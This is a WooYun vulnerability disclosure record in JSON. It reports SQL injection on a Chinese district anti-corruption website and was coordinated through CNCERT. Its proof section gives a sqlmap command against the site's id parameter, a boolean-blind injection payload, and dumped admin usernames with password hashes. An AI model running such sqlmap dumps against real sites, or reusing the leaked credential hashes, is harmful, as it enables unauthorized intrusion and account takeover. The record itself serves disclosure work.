{"id": 80808, "wybug_id": "wooyun-2015-0155109", "wybug_title": "中原廉政网存在注入漏洞", "wybug_corp": "中原廉政网", "wybug_author": "路人甲", "wybug_date": "2015-11-27 00:46", "wybug_open_date": "2016-01-15 18:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向公众公开  简要描述： 参数过滤不严，导致注入 详细说明：  中共中原区纪律检查委员会机关与中原区监察局合署办公，实行一套工作机构、两个机关名称的体制，履行党的纪律检查和政府行政监察两种职能。主要职责是：     （一）负责贯彻落实党中央、中央纪委、省委、省纪委、市委、市纪委和区委关于加强党风廉政建设的决定，实施党章范围内的监督，维护党的章程和党内法规，检查党的路线、方针、政策和决议的执行情况，重点检查监督乡（科）级党员领导干部执行党的路线、方针、政策情况以及思想作风方面问题；负责反腐败的协调工作，协助区委抓好党风廉政建设。    （二）负责贯彻落实党中央、国务院、省委、省政府、市委、市政府和区委、区政府有关行政监察工作的决定，实施《行政检查法》规定范围内的监督，重点监督检查区政府各部门及其工作人员、各街道办事处及其负责人、区人民政府直属企事业单位及其由国家行政机关任命的领导干部执行国家和省、市、区的政策、法律法规、国民经济和社会发展计划以及国务院、省、市、区政府颁发的决议和命令的情况。    （三）负责检查并处理区委和区政府各部门、各街道办事处党的组织和区委管理的党员领导干部违反党的章程及党内法规的案件或其他重要、复杂案件，决定或取消对这些案件中党员的处分；受理党员的控告和申诉，保护党员的民主权利和合法权益。    （四）负责调查处理区政府各部门及其他工作人员、各街道办事处及其主要负责人、区政府直属企事业单位及国家行政机关任命的工作人员的违反国家政策和法律、法规以及违反政纪的行为，并根据责任人所犯错误的情节轻重，作出相应处分或提出处理建议，报上级领导机关审批（涉及选举产生的领导干部按法律程序办理）；受理监察对象不服政纪处分的申诉，受理个人或单位对监察对象违纪行为的检举、控告，保护监察对象的正当权利和合法权益。    （五）负责作出关于维护党的决定，制定党风党纪教育规划，会同有关部门做好党的纪律检查和行政监察工作方针、政策和法律法规的宣传工作和对党员进行遵守纪律的教育工作。    （六）负责对党的纪律检查工作政策、理论及有关问题进行检查研究，拟定全区党纪条规和政策规定；参与制定党内法规。（七）调查了解区政府各部门和各街道办事处制定的有关政策、法规的情况，对违反国家法律和有损国家利益的条款提出修改建议；变更或撤销下级行政监察部门不适当的决议和规定。    （八）会同区直属有关部门以及各街道党工委、办事处做好纪检监察干部的管理工作。审核各街道纪工委领导班子、监察室主任人选；负责区纪委、监察局派驻区直各部门区管干部的提名和其他领导干部的任免工作；组织和指导全区纪检、监察系统干部培训和组织建设工作。（九）承办区委、区政府和上级纪检、监察机关交办的其他事项。   漏洞证明：  清风中原廉政网\nsqlmap -u \"http://**.**.**.**/Shownews.asp?id=206\" -T admin --columns --batch\n\nsqlmap resumed the following injection point(s) from stored session:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=206 AND 6484=6484---[08:58:24] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access\n查看数据......\nDatabase: Microsoft_Access_masterdbTable: admin[2 entries]+--------+----------+------------------+| user   | username | password         |+--------+----------+------------------+| 涓..寤..缃. | admin    | a7a0bd9ef71d8cf9 || 涓..寤..缃. | 002      | cddba2c733c65f23 |+--------+----------+------------------+\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-12-01 18:33 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发给河南分中心，由河南分中心后续协调网站管理单位处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}